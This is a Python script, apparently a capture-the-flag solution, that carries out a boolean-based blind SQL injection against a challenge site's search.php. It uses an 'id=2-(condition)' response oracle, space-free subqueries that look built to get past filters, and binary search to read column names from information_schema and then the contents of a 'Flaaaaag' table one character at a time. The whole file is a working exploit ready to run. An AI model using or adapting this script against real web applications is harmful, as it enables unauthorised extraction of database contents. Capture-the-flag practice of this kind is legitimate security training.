#!/usr/bin/env python3
"""Extract column names and flag from Flaaaaag table"""
import urllib.request

BASE = "https://f4e3f42b4687b3d9401c897d.http-ctf2.dasctf.com/search.php"

def oracle(condition):
    url = f"{BASE}?id=2-({condition})"
    try:
        resp = urllib.request.urlopen(url, timeout=10).read().decode('utf-8', errors='ignore')
        return 'NO! Not this!' in resp
    except:
        return False

def extract_str(subquery, maxlen=50):
    # Get length
    lo, hi = 0, maxlen
    while lo < hi:
        mid = (lo + hi + 1) // 2
        if oracle(f"length({subquery})>={mid}"):
            lo = mid
        else:
            hi = mid - 1
    length = lo
    print(f"  Length: {length}")
    if length == 0:
        return ""
    # Extract chars
    result = ""
    for pos in range(1, length + 1):
        lo, hi = 32, 126
        while lo < hi:
            mid = (lo + hi + 1) // 2
            if oracle(f"ord(substr({subquery},{pos},1))>={mid}"):
                lo = mid
            else:
                hi = mid - 1
        c = chr(lo)
        result += c
        print(f"  [{pos}/{length}] '{c}' => {result}")
    return result

# Step 1: Get column names
col_subquery = "(select(group_concat(column_name))from(information_schema.columns)where(table_name)regexp('Flaaaaag'))"
print("[*] Column names in Flaaaaag:")
cols = extract_str(col_subquery)
print(f"[+] Columns: {cols}")

# Step 2: Read the flag from each column
if cols:
    col_list = cols.split(',')
    for col in col_list:
        print(f"\n[*] Reading data from Flaaaaag.{col}:")
        data_subquery = f"(select(group_concat({col}))from(Flaaaaag))"
        data = extract_str(data_subquery, maxlen=200)
        print(f"[+] {col} = {data}")
